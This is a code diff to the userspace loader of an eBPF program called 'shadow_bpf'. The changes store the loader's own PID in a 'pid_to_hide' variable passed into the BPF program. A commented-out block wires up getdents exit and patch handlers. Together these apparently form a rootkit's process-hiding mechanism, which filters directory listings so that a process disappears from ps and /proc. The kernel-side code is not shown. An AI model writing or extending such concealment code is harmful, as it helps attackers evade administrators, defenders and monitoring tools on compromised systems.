@@ -80,7 +80,7 @@ static int handle_event(void *ctx, void *data, size_t data_sz)
     return 0;
 }
 
-int main(int argc, char **argv)
+int main(int argc, char *argv[])
 {
     struct shadow_bpf *skel = NULL;
     struct ring_buffer *rb = NULL;
@@ -96,6 +96,12 @@ int main(int argc, char **argv)
         fprintf(stderr, "Failed to open BPF skeleton: %s\n", strerror(errno));
         goto cleanup;
     }
+
+    char pid_to_hide[MAX_PID_LEN] = { 0 };
+    int pid = getpid();
+    sprintf(pid_to_hide, "%d", pid);
+    strncpy(skel->rodata->pid_to_hide, pid_to_hide, sizeof(skel->rodata->pid_to_hide));
+    skel->rodata->pid_to_hide_len = strlen(pid_to_hide) + 1;
 
     /* load and verify BPF program */
     err = shadow_bpf__load(skel);
@@ -117,7 +123,32 @@ int main(int argc, char **argv)
         fprintf(stderr, "Failed to add program to prog array! %s\n", strerror(errno));
         goto cleanup;
     }
-
+    /*
+    index = PROG_03;
+    prog_fd = bpf_program__fd(skel->progs.handle_getdents_exit);
+    ret = bpf_map_update_elem(
+        bpf_map__fd(skel->maps.map_prog_array),
+        &index, 
+        &prog_fd,
+        BPF_ANY
+    );
+    if (ret == -1) {
+        fprintf(stderr, "Failed to add program to prog array! %s\n", strerror(errno));
+        goto cleanup;
+    } 
+    index = PROG_04;
+    prog_fd = bpf_program__fd(skel->progs.handle_getdents_patch);
+    ret = bpf_map_update_elem(
+        bpf_map__fd(skel->maps.map_prog_array),
+        &index, 
+        &prog_fd,
+        BPF_ANY
+    );
+    if (ret == -1) {
+        fprintf(stderr, "Failed to add program to prog array! %s\n", strerror(errno));
+        goto cleanup;
+    } 
+    */
     /* attach kprobes */
     err = shadow_bpf__attach(skel);
     if (err) {
@@ -134,6 +165,7 @@ int main(int argc, char **argv)
     }
 
     printf("Successfully started!\n"); 
+    printf("PID: %d\n", pid);
 
     while (!exiting) {
         err = ring_buffer__poll(rb, 100 /* timeout, ms */);
